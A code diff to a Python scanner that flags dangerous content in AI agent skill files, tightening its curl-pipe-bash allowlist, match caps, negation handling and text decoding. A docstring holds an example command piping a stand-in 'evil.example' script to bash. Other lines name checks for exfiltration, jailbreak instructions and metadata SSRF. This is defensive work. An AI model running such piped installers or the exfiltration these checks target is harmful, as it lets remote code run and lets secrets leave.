@@ -36,6 +36,7 @@ import base64
 # start each time is quadratic: a file with thousands of matches on one long
 # line took minutes. These keep it linear.
 import bisect as _bisect
+import contextvars
 import functools as _functools
 import itertools
 import os
@@ -47,6 +48,16 @@ from .js_taint_analysis import analyze_js_taint
 from .taint_analysis import analyze_taint_flows
 
 _MAX_MATCHES_PER_CHECK = 500  # per rule; a real skill never gets close
+# Hard ceiling on matches examined per rule. Only REPORTED hits count toward
+# _MAX_MATCHES_PER_CHECK, so 500 harmless (trusted or negated) matches can't
+# push a real one past the cap; this bounds the CPU spent getting there.
+_MAX_MATCHES_EXAMINED = 20000
+
+# Whether the file being scanned is prose (markdown/text) or code. Negation
+# phrases ("do not", "never", ...) only excuse a match across a paragraph in
+# prose; in code, a word in an unrelated comment must not hide a command.
+_SCANNING_PROSE = contextvars.ContextVar("husk_scanning_prose", default=True)
+PROSE_EXTENSIONS = (".md", ".mdc", ".txt", ".rst")
 _LOOKBACK = 4096  # context checks never need more than a few KB before a match
 
 
@@ -199,11 +210,15 @@ _INSTALL_URL_RE = re.compile(r"https?://([^\s|'\")]+)", re.IGNORECASE)
 
 
 def _curl_pipe_host_is_trusted(matched_text):
-    """True if the curl|bash command in matched_text fetches from a host on
-    the trusted-installer allowlist."""
-    m = _INSTALL_URL_RE.search(matched_text)
-    if not m:
-        return False
+    """True if the curl|bash command in matched_text fetches only from hosts
+    on the trusted-installer allowlist. Every URL in the command must be
+    trusted: `curl https://bun.sh/install https://evil.example/x | bash`
+    is not."""
+    urls = list(_INSTALL_URL_RE.finditer(matched_text))
+    return bool(urls) and all(_url_is_trusted_installer(m) for m in urls)
+
+
+def _url_is_trusted_installer(m):
     # Compare the real hostname (and path prefix where one is listed), never a
     # substring of the whole URL: "evil.com/?x=astral.sh", "astral.sh.evil.com"
     # and "notbun.sh" must NOT count as trusted.
@@ -227,9 +242,18 @@ def scan_for_dangerous_patterns(text):
     """
     findings = []
     for pattern, description in DANGEROUS_PATTERNS:
+        reported = 0
         for k, match in enumerate(re.finditer(pattern, text, re.IGNORECASE)):
-            if k >= _MAX_MATCHES_PER_CHECK:
+            if reported >= _MAX_MATCHES_PER_CHECK:
                 break  # thousands of repeats add nothing to the verdict, only CPU
+            if k >= _MAX_MATCHES_EXAMINED:
+                findings.append(
+                    f"Line {_line_no(text, match.start())}: stopped checking after "
+                    f"{_MAX_MATCHES_EXAMINED} matches of one rule ({description}) - "
+                    f"the rest of this file was not inspected for it. Mass "
+                    f"repetition is a known way to hide one real hit."
+                )
+                break
             if _is_negated(text, match.start()):
                 continue
             if pattern in CALL_SYNTAX_ONLY_PATTERNS and _is_call_syntax_inside_comment_or_string(text, match.start()):
@@ -237,12 +261,10 @@ def scan_for_dangerous_patterns(text):
             # Show which line it's on, so a human can go verify it directly.
             line_num = _line_no(text, match.start())
             marker = ""
-            if description.startswith("Pipes a downloaded script"):
-                ls = _bounded_rfind(text, "\n", match.start()) + 1
-                le = text.find("\n", match.end())
-                le = le if le != -1 else len(text)
-                if _curl_pipe_host_is_trusted(text[ls:le]):
-                    marker = SOFT_FINDING_MARKER
+            if description.startswith("Pipes a downloaded script") and _curl_pipe_host_is_trusted(match.group(0)):
+                marker = SOFT_FINDING_MARKER
+            if not marker:
+                reported += 1
             findings.append(f"{marker}Line {line_num}: {description} ('{match.group(0).strip()}')")
     return findings
 
@@ -440,9 +462,15 @@ def _is_negated(text, match_start):
     current paragraph (nearest blank line) rather than a fixed window,
     since a negation like 'MUST NOT:' is often followed by a multi-line
     bullet list where the actual pattern appears several lines later."""
+    line_start = _bounded_rfind(text, "\n", match_start) + 1
+    same_line = text[line_start:match_start].lower()
+    if any(phrase in same_line for phrase in NEGATION_PHRASES):
+        return True
+    if not _SCANNING_PROSE.get():
+        return False
     paragraph_start = _bounded_rfind(text, "\n\n", match_start)
     paragraph_start = paragraph_start + 2 if paragraph_start != -1 else 0
-    preceding = text[paragraph_start:match_start].lower()
+    preceding = text[paragraph_start:line_start].lower()
     return any(phrase in preceding for phrase in NEGATION_PHRASES)
 
 
@@ -3379,13 +3407,49 @@ def find_self_updating_skill(text):
     return [SOFT_FINDING_MARKER + f"Line {_line_no(text, m.start())}: re-downloads skill instructions from the internet "
             f"into a skills folder ('{m.group(0)[:90].strip()}') - future versions can change without review"]
 
-def scan_skill_file(path):
+def decode_text(raw):
+    """Decode file bytes the way the program that runs them would, with
+    newlines normalized to LF (as text-mode reading did). UTF-16 and UTF-32
+    (with a BOM, or BOM-less but NUL-interleaved) used to be read as UTF-8,
+    which turned every character into noise and hid the whole file from
+    every rule - PowerShell runs UTF-16 scripts natively."""
+    text = _decode_bytes(raw)
+    return text.replace("\r\n", "\n").replace("\r", "\n")
+
+
+def _decode_bytes(raw):
+    for bom, codec in ((b"\xff\xfe\x00\x00", "utf-32-le"), (b"\x00\x00\xfe\xff", "utf-32-be"),
+                       (b"\xff\xfe", "utf-16-le"), (b"\xfe\xff", "utf-16-be")):
+        if raw.startswith(bom):
+            return raw[len(bom):].decode(codec, errors="replace")
+    head = raw[:4096]
+    if len(head) >= 16:
+        third = len(head) // 3
+        if head[1::2].count(b"\x00") > third and head[0::2].count(b"\x00") == 0:
+            return raw.decode("utf-16-le", errors="replace")
+        if head[0::2].count(b"\x00") > third and head[1::2].count(b"\x00") == 0:
+            return raw.decode("utf-16-be", errors="replace")
+    return raw.decode("utf-8-sig", errors="replace")
+
+
+def scan_skill_file(path, kind=None):
+    """Scan one file. `kind` overrides the extension used to choose
+    language-specific rules (e.g. ".sh" for an extensionless script with a
+    shell shebang)."""
     try:
-        with open(path, encoding="utf-8", errors="replace") as f:
-            text = f.read()
+        with open(path, "rb") as f:
+            text = decode_text(f.read())
     except OSError as e:
         return {"verdict": "ERROR", "findings": [f"Could not read file: {e}"]}
+    ext = (kind or os.path.splitext(path)[1]).lower()
+    token = _SCANNING_PROSE.set(ext in PROSE_EXTENSIONS or ext == "")
+    try:
+        return _scan_text(text, ext)
+    finally:
+        _SCANNING_PROSE.reset(token)
 
+
+def _scan_text(text, ext):
     findings = []
 
     # Check 1: whitespace inflation
@@ -3574,9 +3638,9 @@ def scan_skill_file(path):
     findings.extend(find_c2_exfil_sink(text))
     findings.extend(find_prompt_exfiltration(text))
     findings.extend(find_jailbreak_instruction(text))
-    if path.lower().endswith((".py", ".js", ".ts", ".sh", ".rb", ".go", ".rs", ".ps1")):
+    if ext in (".py", ".js", ".ts", ".sh", ".rb", ".go", ".rs", ".ps1", ".mjs", ".cjs", ".bash"):
         findings.extend(find_cloud_metadata_ssrf(text))
-    if path.lower().endswith((".js", ".ts", ".mjs", ".cjs", ".jsx", ".tsx")):
+    if ext in (".js", ".ts", ".mjs", ".cjs", ".jsx", ".tsx"):
         findings.extend(find_js_env_exfiltration(text))
         for jf in analyze_js_taint(text):
             findings.append(str(jf))
@@ -3602,7 +3666,7 @@ def scan_skill_file(path):
     # Exception: if a network-send call sits within a few lines of the
     # credential reference, it is code embedded in the document (the
     # tests/credential_theft.md shape), not prose, and stays a hard finding.
-    if path.lower().endswith((".md", ".mdc", ".txt", ".rst")):
+    if ext in PROSE_EXTENSIONS:
         lines = text.split("\n")
 
         def _send_nearby(finding):
